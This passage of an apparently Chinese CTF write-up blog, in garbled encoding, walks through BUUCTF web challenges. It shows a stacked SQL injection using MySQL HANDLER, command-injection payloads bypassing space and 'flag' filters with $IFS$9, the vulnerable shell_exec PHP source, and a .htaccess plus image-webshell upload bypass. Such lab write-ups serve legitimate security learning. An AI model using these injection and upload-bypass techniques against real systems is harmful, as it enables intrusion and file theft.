class=\"hljs-emphasis\">insert into handler_table values(2, &#x27;name2&#x27;, 002);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(5, &#x27;name5&#x27;, 005);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(1, &#x27;name1&#x27;, 001);  </span><br><span class=\"hljs-emphasis\">insert into handler_table values(4, &#x27;name4&#x27;, 004);  </span><br><span class=\"hljs-emphasis\">insert into handler_</span>table values(3, <span class=\"hljs-emphasis\">&#x27;name3&#x27;</span>, 003);<br><br>3.2 ä¸é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨<br><br>æ‰“å¼€å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆã€‘<br><br>mysql&gt; handler handler_table open;<br><br>æŸ¥çœ‹è¡¨æ•°æ®ï¼š<br><br><span class=\"hljs-section\">mysql&gt; handler handler_table read first;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    1 | name1 |    1 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler handler_table read next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br>mysql&gt; handler handler_table read next;<br>Empty set (0.00 sec)<br><br><br>å…³é—­å¥æŸ„ï¼š<br><br>mysql&gt; handler handler_table close;<br>Query OK, 0 rows affected (0.00 sec)<br><br>3.3 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆFIRST,NEXT,PREV,LASTï¼‰<br>é€šè¿‡ç´¢å¼•æŸ¥çœ‹çš„è¯ï¼Œå¯ä»¥æŒ‰ç…§ç´¢å¼•çš„å‡åºï¼Œä»å°åˆ°å¤§ï¼ŒæŸ¥çœ‹è¡¨ä¿¡æ¯ã€‚<br><br>åˆ›å»ºç´¢å¼•ï¼š<br><br>mysql&gt; create index handler_index on handler_table(c1);<br><br>æ‰“å¼€å¥æŸ„ï¼š<br><br>mysql&gt; handler handler_table open as p;<br><br>æŸ¥çœ‹è¡¨æ•°æ®ï¼š<br><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index first;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    1 | name1 |    1 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index prev;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index last;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><br><br><br>å…³é—­å¥æŸ„ï¼š<br><br>mysql&gt; handler p close;<br><br>3.4 é€šè¿‡ç´¢å¼•æ‰“å¼€æŸ¥çœ‹è¡¨ï¼ˆ=,&lt;=,&gt;=,&lt;,&gt;ï¼‰<br>ä»indexä¸º2çš„åœ°æ–¹å¼€å§‹<br><br>æ‰“å¼€å¥æŸ„ï¼š<br><br>mysql&gt; handler handler_table open as p;<br><br>æŸ¥çœ‹è¡¨æ•°æ®ï¼š<br><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index = (2);</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    2 | name2 |    2 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;     </span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    3 | name3 |    3 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    4 | name4 |    4 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index next;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">mysql&gt; handler p read handler_index last;</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">| c1   | c2    | c3   |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><span class=\"hljs-section\">|    5 | name5 |    5 |</span><br><span class=\"hljs-section\">+------+-------+------+</span><br><br>å…³é—­å¥æŸ„ï¼š<br><br>mysql&gt; handler p close;<br><br>3.5 é™„åŠ ï¼šè¯­æ³•å®ä¾‹å‚è€ƒ<br><br>handler handler<span class=\"hljs-emphasis\">_table open;</span><br><span class=\"hljs-emphasis\">handler handler_table open as p;</span><br><span class=\"hljs-emphasis\">handler handler_table read first;</span><br><span class=\"hljs-emphasis\">handler handler_table read next;</span><br><span class=\"hljs-emphasis\">handler handler_table read first limit 3;</span><br><span class=\"hljs-emphasis\">handler handler_table read next limit 3,3;</span><br><span class=\"hljs-emphasis\">handler handler_table read first where c1 &gt; 2 limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read next where c1 &gt;2 limit 1,2;</span><br><span class=\"hljs-emphasis\"> </span><br><span class=\"hljs-emphasis\">create index handler_index on handler_table(c1);</span><br><span class=\"hljs-emphasis\">handler handler_table open;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index first;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index next limit 3;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index PREV limit 3,3;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index LAST where c1 &gt; 2 limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index LAST where c1 &gt; 2 limit 1,2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index = (3);</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &lt;= (3) limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &gt;= (3) limit 1,2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &lt; (4)  where c1 &gt; 0 limit 2;</span><br><span class=\"hljs-emphasis\">handler handler_table read handler_index &gt; (1)  where c1 &lt; 6 limit 2,2;</span><br><span class=\"hljs-emphasis\">handler handler_table close;</span><br><span class=\"hljs-emphasis\">drop index handler_index on handler_</span>table;<br><br></code></pre></td></tr></table></figure>\n\n<p>è¿™é‡Œçœ‹æ‡‚ä»¥åï¼Œæˆ‘è‡ªå·±åˆé‡æ–°æ„é€ äº†ä¸€ä¸ª</p>\n<figure class=\"highlight 1c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs 1c\"><span class=\"hljs-number\">1</span>&#x27;; handler `<span class=\"hljs-number\">19198109311145</span>14` open;handler `<span class=\"hljs-number\">19198109311145</span>14` read first;<br></code></pre></td></tr></table></figure>\n\n<p>æ•ˆæœä¸€æ ·ï¼Œæ„æ€ä¹Ÿå·®ä¸å¤š</p>\n<p><img src=\"/post/wp-buuctf/image-20220731224702281.png\" alt=\"image-20220731224702281\"></p>\n<h2 id=\"2-GXYCTF2019-Ping-Ping-Ping\"><a href=\"#2-GXYCTF2019-Ping-Ping-Ping\" class=\"headerlink\" title=\"2.[GXYCTF2019]Ping Ping Ping\"></a>2.[GXYCTF2019]Ping Ping Ping</h2><h3 id=\"1-é¢˜ç›®æè¿°\"><a href=\"#1-é¢˜ç›®æè¿°\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp\"><a href=\"#2-wp\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>çœ‹åå­—åº”è¯¥æ˜¯é“å‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®</p>\n<p>å…ˆä¼ ä¸€ä¸ªIP:123.123.123.123è¯•è¯•</p>\n<p><code>?ip=123.123.123.123</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706231831194.png\" alt=\"image-20220706231831194\"></p>\n<p>çœ‹èµ·æ¥æ˜¯Linuxå‘½ä»¤ï¼Œå…ˆæ˜¾ç¤ºæ‰€æœ‰æ–‡ä»¶è¯•è¯•ï¼ˆ;æ˜¯é¡ºåºæ‰§è¡Œï¼Œä»å·¦å¾€å³ï¼Œå‘½ä»¤å…¨éƒ¨æ‰§è¡Œï¼‰</p>\n<p><code>?ip=123.123.123.123;ls</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706232001574.png\" alt=\"image-20220706232001574\"></p>\n<p>çœ‹åˆ°flagæ–‡ä»¶ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ç›´æ¥è¯»å‡º</p>\n<p><img src=\"/post/wp-buuctf/image-20220706232135596.png\" alt=\"image-20220706232135596\"></p>\n<p>å‘ç°ï¼Œç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œæˆ‘è¯•è¯•äº†å¾ˆå¤šç»•è¿‡ï¼Œæ¯”å¦‚%0aï¼Œ%20ï¼Œ%09ï¼Œ&lt;&gt;ï¼Œä½†æ˜¯å›æ˜¾éƒ½æ˜¯</p>\n<p><code>?ip=123.123.123.123;cat%0aflag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706233818795.png\" alt=\"image-20220706233818795\"></p>\n<p>æ„æ€æ˜¯ç¬¦å·éƒ½è¿‡æ»¤äº†</p>\n<p>è¿™é‡Œå¼•å…¥æˆ‘ä¸€ä¸ªæ–°å­¦çš„ç©ºæ ¼ä»£æ›¿ç¬¦$IFS$9ï¼Œè¿™æ˜¯ä¸ªshellä¸­å®šä¹‰çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨æ­¤å¤„å¯ä»¥ç»•è¿‡è¿‡æ»¤</p>\n<p>$IFS$9ï¼ˆ$IFSæ˜¯<strong>Unix</strong>ç³»ç»Ÿçš„ä¸€ä¸ªé¢„è®¾å˜é‡è¡¨ç¤ºåˆ†éš”ç¬¦ï¼Œ$9åªæ˜¯å½“å‰ç³»ç»Ÿshellè¿›ç¨‹çš„ç¬¬ä¹ä¸ªå‚æ•°çš„æŒæœ‰è€…ï¼Œå®ƒå§‹ç»ˆä¸ºç©ºå­—ç¬¦ä¸²ï¼‰</p>\n<p>è¯•è¯•</p>\n<p><code>?ip=123.123.123.123;cat$IFS$9flag.php</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220706234926216.png\" alt=\"image-20220706234926216\"></p>\n<p>å‘ç°flagä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œé‚£å°±åªå¥½å…ˆçœ‹çœ‹index.phpæ–‡ä»¶ï¼Œè¯•è¯•èƒ½ä¸èƒ½çœ‹åˆ°å…¶ä»£ç </p>\n<p><code>?ip=123.123.123.123;cat$IFS$9index.php</code></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">/?ip=<br>&lt;pre&gt;/?ip=<br><span class=\"hljs-meta\">&lt;?php</span><br><span class=\"hljs-keyword\">if</span>(<span class=\"hljs-keyword\">isset</span>(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>]))&#123;<br>  <span class=\"hljs-variable\">$ip</span> = <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">&#x27;ip&#x27;</span>];<br>  <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;1f&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"hljs-variable\">$ip</span>, <span class=\"hljs-variable\">$match</span>))&#123;<br>    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/\\&amp;|\\/|\\?|\\*|\\&lt;|[\\x&#123;00&#125;-\\x&#123;20&#125;]|\\&gt;|\\&#x27;|\\&quot;|\\\\|\\(|\\)|\\[|\\]|\\&#123;|\\&#125;/&quot;</span>, <span class=\"hljs-variable\">$ip</span>, <span class=\"hljs-variable\">$match</span>);<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your symbol!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/ /&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your space!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/bash/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your bash!&quot;</span>);<br>  &#125; <span class=\"hljs-keyword\">else</span> <span class=\"hljs-keyword\">if</span>(<span class=\"hljs-title function_ invoke__\">preg_match</span>(<span class=\"hljs-string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))&#123;<br>    <span class=\"hljs-keyword\">die</span>(<span class=\"hljs-string\">&quot;fxck your flag!&quot;</span>);<br>  &#125;<br>  <span class=\"hljs-variable\">$a</span> = <span class=\"hljs-title function_ invoke__\">shell_exec</span>(<span class=\"hljs-string\">&quot;ping -c 4 &quot;</span>.<span class=\"hljs-variable\">$ip</span>);<br>  <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">&quot;&lt;pre&gt;&quot;</span>;<br>  <span class=\"hljs-title function_ invoke__\">print_r</span>(<span class=\"hljs-variable\">$a</span>);<br>&#125;<br><br><span class=\"hljs-meta\">?&gt;</span><br><br></code></pre></td></tr></table></figure>\n\n<p>çœ‹åˆ°ipæœ‰å¾ˆå¤šæ­£åˆ™åŒ¹é…çš„å­—ç¬¦ï¼Œæ‰€ä»¥æ²¡æœ‰é‚£ä¹ˆå®¹æ˜“ç»•è¿‡</p>\n<figure class=\"highlight mipsasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mipsasm\"><span class=\"hljs-keyword\">shell_exec </span>â€” é€šè¿‡ <span class=\"hljs-keyword\">shell </span>ç¯å¢ƒæ‰§è¡Œå‘½ä»¤ï¼Œå¹¶ä¸”å°†å®Œæ•´çš„è¾“å‡ºä»¥å­—ç¬¦ä¸²çš„æ–¹å¼è¿”å›ã€‚<br><span class=\"hljs-keyword\">shell_exec(string </span>$cmd): string<br>exec æ˜¯ <span class=\"hljs-keyword\">Shell </span>å†…ç½®å‘½ä»¤ï¼Œå®ƒæœ‰ä¸¤ç§ç”¨æ³•ï¼Œä¸€ç§æ˜¯æ‰§è¡Œ <span class=\"hljs-keyword\">Shell </span>å‘½ä»¤ï¼Œä¸€ç§æ˜¯æ“ä½œæ–‡ä»¶æè¿°ç¬¦<br>ping -c <span class=\"hljs-built_in\">Count</span> æŒ‡å®šè¦è¢«å‘é€ï¼ˆæˆ–æ¥æ”¶ï¼‰çš„å›é€ä¿¡å·è¯·æ±‚çš„æ•°ç›®ï¼Œç”± <span class=\"hljs-built_in\">Count</span> å˜é‡æŒ‡å‡º<br>--(æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åªèƒ½è¾“å…¥å››ä¸ªå­—ç¬¦)--<br></code></pre></td></tr></table></figure>\n\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\">print_rå‡½æ•°ç”¨äºæ‰“å°å˜é‡ï¼Œä»¥æ›´å®¹æ˜“ç†è§£çš„å½¢å¼å±•ç¤º<br><br>ä¾‹å­<br><span class=\"hljs-meta\">&lt;?php</span> <br><span class=\"hljs-variable\">$a</span> = <span class=\"hljs-keyword\">array</span> (<span class=\"hljs-string\">&#x27;a&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;apple&#x27;</span>, <span class=\"hljs-string\">&#x27;b&#x27;</span> =&gt; <span class=\"hljs-string\">&#x27;banana&#x27;</span>, <span class=\"hljs-string\">&#x27;c&#x27;</span> =&gt; <span class=\"hljs-keyword\">array</span> (<span class=\"hljs-string\">&#x27;x&#x27;</span>,<span class=\"hljs-string\">&#x27;y&#x27;</span>,<span class=\"hljs-string\">&#x27;z&#x27;</span>)); <br><span class=\"hljs-title function_ invoke__\">print_r</span> (<span class=\"hljs-variable\">$a</span>); <br><span class=\"hljs-meta\">?&gt;</span><br>è¾“å‡ºç»“æœ<br><span class=\"hljs-title function_ invoke__\">Array</span><br>(<br>    [a] =&gt; apple<br>    [b] =&gt; banana<br>    [c] =&gt; <span class=\"hljs-title function_ invoke__\">Array</span><br>        (<br>            [<span class=\"hljs-number\">0</span>] =&gt; x<br>            [<span class=\"hljs-number\">1</span>] =&gt; y<br>            [<span class=\"hljs-number\">2</span>] =&gt; z<br>        )<br><br>)<br></code></pre></td></tr></table></figure>\n\n<p>flagè¿‡æ»¤è¯­å¥çš„æ„æ€åˆ¤æ–­æ˜¯å¦æŒ‰é¡ºåºå‡ºç°flag</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs stylus\"><span class=\"hljs-keyword\">else</span> <span class=\"hljs-built_in\">if</span>(<span class=\"hljs-built_in\">preg_match</span>(<span class=\"hljs-string\">&quot;/.*f.*l.*a.*g.*/&quot;</span>, <span class=\"hljs-variable\">$ip</span>))<br></code></pre></td></tr></table></figure>\n\n<p>æ‰€ä»¥åªè¦ipé‡Œçš„flagå‡ºç°ä¸æŒ‰é¡ºåºå°±è¡Œï¼Œä¹Ÿå°±æ˜¯flagå¦ä¸€ç§æ–¹å¼è¡¨ç¤º</p>\n<p>æˆ‘ä»¬çœ‹æºç çŸ¥é“æœ‰ä¸¤ä¸ªå˜é‡ï¼Œä¸€ä¸ªæ˜¯$ip,$a</p>\n<p>ipå˜é‡æ— æ³•æ”¹å˜ï¼Œå˜é‡aå¯ä»¥å°è¯•èµ‹å€¼flagè¯•è¯•èƒ½ä¸èƒ½ç»•è¿‡æ­£åˆ™åŒ¹é…ï¼Œä½†æ˜¯å¦‚æœæ˜¯a&#x3D;flagï¼Œå°±ä¼šé¡ºåºå‡ºç°flagï¼ŒåŒ¹é…ï¼Œæ‰€ä»¥è¯•è¯•a&#x3D;gï¼Œflagâ€“&gt;fla$a</p>\n<p><code>?ip=127.0.0.1;a=g;cat$IFS$9fla$a.php</code></p>\n<p>æŸ¥çœ‹æºç </p>\n<p>å¾—åˆ°flag</p>\n<h2 id=\"3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢\"><a href=\"#3-MRCTF2020-ä½ ä¼ ä½ ğŸå‘¢\" class=\"headerlink\" title=\"3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢\"></a>3.[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</h2><h3 id=\"1-é¢˜ç›®æè¿°-1\"><a href=\"#1-é¢˜ç›®æè¿°-1\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-1\"><a href=\"#2-wp-1\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p> çœ‹æ ‡é¢˜çŸ¥é“è¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„é¢˜ç›®ï¼Œè¦æ±‚ä¸Šä¼ ä¸€ä¸ªæœ¨é©¬</p>\n<p><img src=\"/post/wp-buuctf/image-20220710111959632.png\" alt=\"image-20220710111959632\"></p>\n<p>æ‰“å¼€å…ˆçœ‹åˆ°ä¸€ä¸ªå°¸ä½“åœ¨åœ¨ç¬‘ï¼Œæˆ‘ä»¬å…ˆè¯•è¯•èƒ½ä¸èƒ½ç›´æ¥ä¸Šä¼ phpæ–‡ä»¶</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>çœ‹æ¥ä¸è¡Œï¼Œé‚£åœ¨è¯•è¯•èƒ½ä¸èƒ½æŠ“åŒ…ä¿®æ”¹å‰ç«¯æ–‡ä»¶åç¼€åï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯å‰ç«¯éªŒè¯ï¼ŒæŠŠphpæ”¹æˆpngï¼Œåœ¨æŠ“åŒ…ä¿®æ”¹åç¼€ä¸ºphp</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>è¿˜æ˜¯ä¸€æ ·ï¼Œè¿˜æœ‰ä¸€ä¸ªçŒœæƒ³å°±æ˜¯MIMEéªŒè¯ï¼Œå¯¹content-typeè¿›è¡Œäº†æ£€æŸ¥ï¼Œå¯ä»¥è¯•è¯•ä½¿ç”¨bp<a href=\"https://so.csdn.net/so/search?q=%E6%8A%93%E5%8C%85&spm=1001.2101.3001.7020\">æŠ“åŒ…</a>ï¼Œä¿®æ”¹ä¸Šä¼ çš„PHPçš„content-typeä¸ºimage&#x2F;pngï¼Œä½†æ˜¯è¿˜æ˜¯ä¸€æ ·çš„</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>äºæ˜¯ï¼Œå¯ä»¥ç”¨.htaccesså®ç°å›¾ç‰‡é©¬ä»¥phpæ–‡ä»¶å½¢å¼è¯»å–ï¼ˆå¦‚æœä¸äº†è§£å¯ä»¥æŠŠ.htaccessæ–‡ä»¶äº†è§£ä¸€ä¸‹ï¼ŒæŠŠçº¿ä¸‹é¶åœºupload-labsåšä¸€ä¸‹ï¼‰</p>\n<p>ä½†æ˜¯ä¸Šä¼ æ—¶ï¼Œåˆè¢«è¿‡æ»¤äº†</p>\n<p><img src=\"/post/wp-buuctf/image-20220710112344441.png\" alt=\"image-20220710112344441\"></p>\n<p>å°è¯•ä¿®æ”¹æ–‡ä»¶åä¸º.htaccess.pngï¼Œç„¶åç”¨bpæŠ“åŒ…ä¿®æ”¹å›.htaccessï¼Œä¸Šä¼ æˆåŠŸ</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114410888.png\" alt=\"image-20220710114410888\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114422488.png\" alt=\"image-20220710114422488\"></p>\n<p>ç„¶åä¸Šä¼ å›¾ç‰‡æœ¨é©¬</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114444539.png\" alt=\"image-20220710114444539\"></p>\n<p>æŠŠè·¯å¾„å¤åˆ¶ä¸€ä¸‹</p>\n<p><code>http://424ad9a4-20e6-4394-8150-06fc204ba3e0.node4.buuoj.cn:81/upload/9d0fb395a11b49196f664cfa8fe0200a/1.png</code></p>\n<p><img src=\"/post/wp-buuctf/image-20220710114617412.png\" alt=\"image-20220710114617412\"></p>\n<p>èšå‰‘è¿æ¥æˆåŠŸ</p>\n<p><img src=\"/post/wp-buuctf/image-20220710114647722.png\" alt=\"image-20220710114647722\"></p>\n<p>åœ¨æ ¹ç›®å½•å‘ç°flag</p>\n<p>å¾—åˆ°flag</p>\n<h2 id=\"4-RoarCTF-2019-Easy-Calc\"><a href=\"#4-RoarCTF-2019-Easy-Calc\" class=\"headerlink\" title=\"4.[RoarCTF 2019]Easy Calc\"></a>4.[RoarCTF 2019]Easy Calc</h2><h3 id=\"1-é¢˜ç›®æè¿°-2\"><a href=\"#1-é¢˜ç›®æè¿°-2\" class=\"headerlink\" title=\"1)é¢˜ç›®æè¿°\"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2-wp-2\"><a href=\"#2-wp-2\" class=\"headerlink\" title=\"2)wp\"></a>2)wp</h3><p>è¿˜æ˜¯å¾—çœ‹å¤§ä½¬å¾—wpæ‰ä¼š</p>\n<p><a href=\"https://blog.csdn.net/weixin_44077544/article/details/102630714\">åŸæ–‡é“¾æ¥</a></p>\n<p>è¿™æ˜¯calc.phpçš„å†…å®¹ï¼ŒæŸ¥çœ‹æºç å°±å¯ä»¥çœ‹åˆ°</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span 